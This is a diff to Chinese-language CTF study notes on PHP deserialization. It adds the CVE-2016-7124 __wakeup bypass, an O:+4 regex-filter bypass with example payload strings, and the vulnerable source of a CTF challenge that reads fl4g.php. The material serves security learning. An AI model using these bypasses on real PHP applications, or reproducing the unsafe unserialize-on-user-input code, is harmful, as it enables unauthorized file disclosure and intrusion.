@@ -752,13 +752,18 @@ http://xxx/?id=0b1111101000
 
 #### 反序列化
 
-> PHP 的反序列化和 Python 有很大区别。PHP 中只能根据原本模版 (class) 来改，只能改变属性值，不能修改方法 (只能修改构造方法)。PHP 的序列化更像是在前端构建和后端相匹配的数据结构。
->
-> 反序列化也支持反序列化字符串。
->
-> PHP 中类属性只能是 字符串、数值或 bool，只能在外部用 -> 指向其他类型（如函数）
->
-> w00m->{a}: 表示调用 w00m 对象的 a 方法，a 是方法名的字符串
+- PHP 的反序列化和 Python 有很大区别。PHP 中只能根据原本模版 (class) 来改，只能改变属性值，不能修改方法 (只能修改构造方法)。PHP 的序列化更像是在前端构建和后端相匹配的数据结构。
+
+- 反序列化也支持反序列化字符串。
+- PHP 的序列化过程会产生特殊字符（如 %00），如果将序列化结果复制到在线的 base64 网站进行编码可能就会丢掉特殊字符，所以最好直接在 PHP 中进行 base64 或其他一系列编码。
+
+- PHP 中类属性只能是 字符串、数值或 bool，只能在外部用 -> 指向其他类型（如函数）
+
+- w00m->{a}: 表示调用 w00m 对象的 a 方法，a 是方法名的字符串
+
+- 一个 CVE 漏洞 ：当成员属性数目大于实际数目时可绕过 __wakeup 方法(CVE-2016-7124)
+
+  举例：将实际生成的序列化字符串 `O:4:"xctf":1:{s:4:"flag";s:3:"111";}` 改为 `O:4:"xctf":2:{s:4:"flag";s:3:"111";}` 即可绕过 __wakeup()
 
 反序列化代码示例
 
@@ -775,6 +780,30 @@ echo urlencode(serialize($ctfs));
 ?>
 
 // 最后输出时最好使用 urlencode 编码，避免不合规字符串，Cookie 中的 url 编码会被 HTTP 自动解码
+```
+
+##### 反序列化正则绕过
+
+###### 正则匹配 "o" 或 "c" 
+
+将 O:4 改为 O:+4
+
+举例
+
+```php
+if (preg_match('/[oc]:\d+:/i', $var))
+```
+
+得到的序列化字符串为
+
+```bash
+O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
+```
+
+将它改为
+
+```bash
+O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
 ```
 
 #### Gopher 注入 RCE 漏洞
@@ -1263,6 +1292,38 @@ if($key1 && $key2){
     echo $flag;
 }
 
+?>
+```
+
+### 攻防世界 Web_php_unserialize
+
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) { 
+    $var = base64_decode($_GET['var']); 
+    if (preg_match('/[oc]:\d+:/i', $var)) { 
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var); 
+    } 
+} else { 
+    highlight_file("index.php"); 
+} 
 ?>
 ```
 
